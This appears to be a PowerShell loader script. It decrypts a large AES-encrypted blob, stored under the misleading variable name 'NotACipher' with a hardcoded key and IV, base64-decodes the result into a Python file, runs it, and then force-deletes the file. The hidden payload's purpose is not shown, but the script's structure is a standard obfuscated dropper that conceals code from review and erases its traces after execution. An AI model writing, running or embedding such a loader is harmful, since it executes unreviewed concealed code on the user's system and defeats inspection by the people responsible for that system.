Function Decrypt-String{
    param (
        [string]$CipherText,
        [string]$Key,
        [string]$IV
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Convert]::FromBase64String("QluBHDTVQwCiDGwj8MWbjGUCFmvTAi8yoUd5hGE9NPw=")
    $aes.IV = [System.Convert]::FromBase64String("4zMONA9gd9XNX/4AqAP8/w==")
    
    $decryptor = $aes.CreateDecryptor()
    $encryptedBytes = [System.Convert]::FromBase64String($CipherText)
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}
$NotACipher = "MAbdCloLwTpDVEe+MDAeIurgcWgXtL18e4JLhBXiF/CxLefQ5OX3u90CkO6+WeIXek+7gnojzneRpSaqLBJ69z0l04NENlUctn4s69Rq6juifUrMPoJsytnGGDhS+9nSbS0CZZzOf6sxMbX3J2u5KBQPyx483vPT3y2SLH8vNH0d3IXVijwJZqp6/Fp2gOpgiaZE2z6Eb/nby330nBy2P
whWXgp9/W+pP//BnCgzonFObX2HMqtXqTqeY65Yc8Cy1ukIbEpysCFl9HnSVj0X2cAmLaCsLyqMQZUQdFawGwTjVpw8kZvStL/gasEnyQ5WS9afOAz93hunsQZ6zrZ8h7TGSBqeon2ztuxuV/Mds8N+NbiwKzLu/Orgm+kLJkNEBW6xn4fmr2lOfHmoKZhD5tOOc6iiZVdt9SehizS+x2Wt6NjEG26GtjCrqe
SI/VIIJv4H5G/Yv0mbULuPpRRMTzoES/kKsAAYN++s6Zn2W168x7ISeZoeWuL/vcY/F2SkFAgQEl5uqL2EqrvFra+xjVhe2TDnO65lmWWp70mVVyjoo6T2IGgi8L/mbdJ1bztngfuqlw+SO5jiIpWIwoW18xi2GFXhVmafD6iom/URSUxfRJ+CiuczxgBpoxqDiGzqp974KtrHblJ+xXGpSUNyH1XMCRrGafk
PiGJV0KolHg/QZc0AaZZqE3Ee73N/c07bLCi9RhsemqRcnzSV6PIMulsxPPBgJ2YKvNfYyWev772stglajPg7KNfgJbn6dVv+FpOzy3XQKJc/5V7/ibGfrt3/oxG08l86PC2woIRtA1s4u/37CHAv5g6XNFZm+260hSUq1w/2u/5nAqHEZnTOHVMTFW1Ezh1g5JpXhkePFeRtYT4wihdwB0RNdv38X83Iu/Af
tGYjMysK/jOGPYBZMNBr/BUUaUcuoc6UctR/9m6AZjBil1KD3yRoA/KSYHEtanT5OGuWwuFr5heWkexpSH4Kdx0X1wXqlT26KWKEzpAhw/JCUgZOUL7b1CeGzaYExmpV4mMq6MeKgjO2RFs6lAsktWe3rrsqLRnfal2CpIwQ4qEE60St54SaZWTSSHeEaGFpZuTxj2pV0IJrWlHs7ithkTH3NA3Mu83Cbjo2X
RLg/mtDhlu/mK8ltyg6glKrYH4yzgPx91L/rzg8cHp3q9RxBgbrLNmAcLgtjK2XFJO8GZrVkSlJA/jlwFJimx+gAC9wDNi4rzbVFCPYUJE6M0vD3AaHnIC6CrRNE2H10RBgnxJk1Accpym++IdJ+L/Vx/REQLbbqLdqqfT8f0F4Jw3EVkGMdzgzOjQ8EYjFbKlP5x6krpaNus/J+lIg8U3uny09RhYyOqtKgq
g/tyatQ7Zw1nRYPsWNeo/eOvEq/JM="
$DecryptedText = Decrypt-String -CipherText $NotACipher
$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DecryptedText))
$DecodedText | Out-File -FilePath "tmp.py" -Encoding utf8
python tmp.py
Remove-Item -Path "tmp.py" -Force